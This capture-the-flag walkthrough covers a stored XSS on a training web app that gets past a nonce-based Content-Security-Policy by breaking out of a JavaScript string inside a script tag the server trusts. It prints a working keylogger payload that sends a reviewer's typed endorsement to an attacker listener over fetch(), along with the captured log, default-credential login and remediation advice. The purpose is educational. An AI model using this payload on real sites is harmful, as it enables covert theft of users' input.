# NorthKorea — CSP-Nonce Bypass via In-Script Injection → Keylogger
**Difficulty:** Medium · **Category:** Stored XSS / Content-Security-Policy Bypass · **Platform:** WebVerse Pro

Flag redacted throughout — replace `WEBVERSE{REDACTED}` with your own captured value.

---

## Challenge Briefing

> You are a foreign operative working a low-privilege scout account on the KPA Strategic Command portal (issued credentials: ad[min...])

The briefing itself hands over the credentials mid-sentence (`ad...` → `admin`), and a linked writeup gives the general technique without exact payloads: defeat a nonce-based CSP not by trying to sneak in a *new* script tag (which the nonce blocks), but by injecting into a script tag the server *already* trusts and emits with a valid nonce attached.

## Environment Setup

The target IP redirected based on `Host` header — needed a local DNS entry:

```bash
echo "10.100.175.14 northkorea.local" | sudo tee -a /etc/hosts
```

```bash
TARGET3="northkorea.local"
curl -s -i "http://$TARGET3/"
```

```
HTTP/1.1 302 Found
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; script-src 'nonce-d3f18157bd82cb7f7070bbdb1a08296a'; style-src 'self' 'unsafe-inline'; img-src 'self' data: *; connect-src *; frame-ancestors 'none'; base-uri 'none'
Location: /login
```

Two details from this single header matter for the whole rest of the exercise:

- `script-src 'nonce-...'` — a fresh, unpredictable nonce per response. Any `<script>` tag without the matching nonce is refused by the browser, so classic `<script>alert(1)</script>` injection is dead on arrival here.
- `connect-src *` — completely unrestricted. Whatever XSS we do land, we're free to `fetch()`/`XMLHttpRequest` to *any* origin, including our own attacker-controlled listener. This is the exfiltration channel the challenge wants us to use.

## Logging In

```bash
curl -s -c cookies3.txt -i -X POST "http://$TARGET3/login" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=admin"
```

```
HTTP/1.1 302 Found
Set-Cookie: sid=68e8bbfe...; Path=/; HttpOnly; SameSite=Lax
Location: /dashboard
```

`admin`/`admin` worked immediately — the briefing's "issued credentials" line was a straight hint, not a puzzle. Note the session cookie is `HttpOnly`, so even a working XSS can't read it via `document.cookie`; cookie theft isn't the intended path here, which lines up with the challenge instead pointing at capturing *admin input* (an endorsement message) rather than a session token.

## Mapping the App

```bash
curl -s -b cookies3.txt "http://$TARGET3/dashboard"
```

A "FIELD REPORTS" table, currently empty, plus a `+ NEW REPORT` link to `/submit`, and a footer line: *"All field intelligence is reviewed by Marshal Kim ... Endorsement typically within minutes."* That's the challenge telling you, again quite directly, that there's an admin-review bot that will visit whatever you submit — the classic setup for a stored-XSS-against-an-internal-viewer challenge.

```bash
curl -s -b cookies3.txt "http://$TARGET3/submit"
```

```html
<form method="post" action="/submit" autocomplete="off">
  <input name="callsign" required maxlength="500" placeholder="e.g. RED-PINE-7">
  <textarea name="body" rows="10" required maxlength="4000"></textarea>
  <button type="submit">TRANSMIT REPORT</button>
</form>
```

`maxlength="500"` on a field whose sample value is an 11-character callsign is a strong smell — that much headroom is either laziness or, more likely here, a deliberate hint that this field needs to hold a real payload.

## Finding the Injection Point

Submitted a report with a marker payload combining HTML tags and a JS-breakout string, to see how it comes back in two different places: the dashboard list, and the detail page.

```bash
curl -s -b cookies3.txt -c cookies3.txt -i -X POST "http://$TARGET3/submit" \
  --data-urlencode 'callsign=TESTMARK<b>BOLD</b>"'"'"';alert(1);//' \
  --data-urlencode "body=Recon test payload for injection point detection."
```

**Dashboard** (`/dashboard`) — properly HTML-escaped, dead end:
```html
<td>TESTMARK&lt;b&gt;BOLD&lt;/b&gt;&quot;&#39;;alert(1);//</td>
```

**Detail page** (`/review/1`, the actual "Marshal's review console") — a different, unsafe story:

```html
<!--
  Operative metadata is rendered into a hardened, nonce'd <script>
  block per Directive 47-B. CSP forbids any script tag without this
  exact nonce, so the page is "safe by construction".
-->
<script nonce="59e75db11a3ed146197b0b2cc75aa800">
  var operative = {
    callsign: "TESTMARK<b>BOLD</b>"';alert(1);//",
    report_id: 1,
    viewed_at: new Date().toISOString()
  };
  document.getElementById('callsign-display').textContent = operative.callsign;
</script>
```

That HTML comment is almost taunting — it's correct that the CSP forbids any *unauthorized* script tag, but it's wrong to conclude that makes this "safe by construction." The developer's mental model was "nonce = attacker can't run JS here." The actual guarantee a nonce gives you is much narrower: *the browser will only execute script tags carrying the correct nonce.* It says nothing about the **content** of a script tag the server itself decided to emit — and here, the server is emitting untrusted user input as a raw, unescaped JS string literal inside its own legitimately-nonced tag. Our test payload's `"` already terminated the `callsign` string early, proving the break-out works; it just wasn't yet valid enough JS to do anything useful past that point.

Also visible on this page, only shown to the Marshal role via CSS:

```html
<form method="post" action="/review/1/endorse" class="marshal-form" style="display:none">
  <textarea name="endorsement" rows="8"></textarea>
  <button id="endorse-submit" type="submit">ENDORSE</button>
</form>
```

That's our real target: capture whatever Marshal Kim types into that box.

## Building the Payload

Goal: cleanly close the broken JS string and object literal, insert a real statement that listens for `input` events on the `endorsement` textarea and exfiltrates each change via `fetch()` to our listener (allowed by `connect-src *`), then reopen a harmless dummy object so the rest of the original script (`report_id`, `viewed_at`, the `try {...} catch` block) still parses without throwing and breaking the page.

```bash
LISTENER="http://<attacker-tun0-ip>:8000"

PAYLOAD='X"};document.addEventListener("input",function(e){if(e.target&&e.target.name==="endorsement"){fetch("'"$LISTENER"'/log?d="+encodeURIComponent(e.target.value))}});var _y={y:"'
```

Breaking that down:
- `X"}` — closes the `callsign` string and the `operative` object literal.
- `;` — ends the `var operative = {...}` statement cleanly.
- `document.addEventListener("input", ...)` — a real, independent JS statement. Fires on every keystroke in any input/textarea on the page; the handler filters for `e.target.name === "endorsement"` so it only fires for the field we care about.
- `fetch(LISTENER + "/log?d=" + encodeURIComponent(e.target.value))` — sends the *entire current value* of the textarea (not just the new character) to our listener on every keystroke. Because it resends the whole value each time, the last request received before the Marshal submits/stops typing contains the complete message.
- `var _y={y:"` — reopens a syntactically matching object/string pair so the original template's trailing `report_id: 2, viewed_at: ...};` continues to parse as valid JS instead of throwing a `SyntaxError` that would abort the whole script block (including the original's own harmless `try{...}` cosmetic line — not essential to us, but a clean parse avoids any chance of the page behaving obviously "broken" in a way that might make an automated reviewer suspicious or bail out early).

```bash
curl -s -b cookies3.txt -c cookies3.txt -i -X POST "http://$TARGET3/submit" \
  --data-urlencode "callsign=$PAYLOAD" \
  --data-urlencode "body=Requesting priority endorsement, time-sensitive intel."
```

## Verifying Before Waiting on the Bot

Always confirm the injected script actually parses before waiting on an asynchronous reviewer — a broken payload here just silently fails with no feedback loop.

```bash
curl -s -b cookies3.txt "http://$TARGET3/review/2" \
  | sed -n '/<script nonce/,/<\/script>/p'
```

```html
<script nonce="d68fe8f8ab06f38d41978dbefcb8108c">
  var operative = {
    callsign: "X"};document.addEventListener("input",function(e){if(e.target&&e.target.name==="endorsement"){fetch("http://10.9.0.86:8000/log?d="+encodeURIComponent(e.target.value))}});var _y={y:"",
    report_id: 2,
    viewed_at: new Date().toISOString()
  };
  try {
    document.getElementById('callsign-display').textContent = operative.callsign;
  } catch (e) {}
</script>
```

Clean valid JS: `operative` gets defined and immediately reassigned-away as an unused object, our listener registers as a real top-level statement, and `_y` absorbs the trailing template text harmlessly. The nonce on this script tag is the server's own legitimate nonce for this response — our code inherits full execution rights under the page's CSP for free.

## Capturing the Flag

```bash
python3 -m http.server 8000
```

Once Marshal Kim's review bot loaded `/review/2`, our listener registered fires on the endorsement textarea one keystroke at a time:

```
10.9.0.1 - - [09/Jul/2026 13:11:10] "GET /log?d=WEBVE HTTP/1.1" 404 -
10.9.0.1 - - [09/Jul/2026 13:11:11] "GET /log?d=WEBVER HTTP/1.1" 404 -
10.9.0.1 - - [09/Jul/2026 13:11:13] "GET /log?d=WEBVERS HTTP/1.1" 404 -
10.9.0.1 - - [09/Jul/2026 13:11:14] "GET /log?d=WEBVERSE%7B HTTP/1.1" 404 -
...
```

(The `404`s are expected and harmless — `python3 -m http.server` has no `/log` route to serve, but it still logs every incoming request line before responding 404, which is all we need since the data lives in the request itself, not the response.)

Each line's `d=` parameter is the *entire textarea value so far*, URL-encoded, resent from scratch on every keystroke — so we don't need to reconstruct anything from fragments, we just need the **last, longest, complete line** before the requests stop:

```bash
python3 -c "import urllib.parse; print(urllib.parse.unquote('WEBVERSE%7B<redacted>%7D'))"
```

**Flag:** `WEBVERSE{REDACTED}`

## What Went Wrong (Root Cause)

Two independent failures stacked on top of each other:

1. **Weak/default credentials** on an account explicitly labeled low-privilege in the fiction — `admin`/`admin` should never work anywhere, but especially not on a system that reviews and executes side effects from user-submitted content.
2. **User input interpolated raw into a JS execution context.** The developer's comment shows real (if misplaced) security awareness — they specifically thought about CSP and nonces. But they solved the wrong problem: nonce-based CSP defends the *tag*, not the *content*. Treating `callsign` as safe to drop directly into `callsign: "..."` inside a `<script>` block is functionally identical to building a SQL query by string concatenation — it's the same bug (unescaped user input crossing into a code/query language) wearing a different hat.

## Fix

- Never interpolate user-controlled strings directly into a `<script>` block, regardless of whether the tag itself carries a valid CSP nonce. The nonce authorizes the *tag*, not arbitrary content placed inside it.
- If data genuinely needs to reach client-side JS, serialize it properly: `callsign: <?= json_encode($callsign) ?>` (or the framework equivalent) so quotes, angle brackets, and backslashes are correctly escaped as JSON, not raw string concatenation.
- Alternatively, avoid the pattern entirely: render the value into a `data-*` HTML attribute (which *is* HTML-escaped by the templating layer) and read it from JS via `element.dataset`, rather than baking it into an inline `<script>` at all.
- Rotate away from default credentials, and rate-limit/alert on login attempts using well-known default combinations.
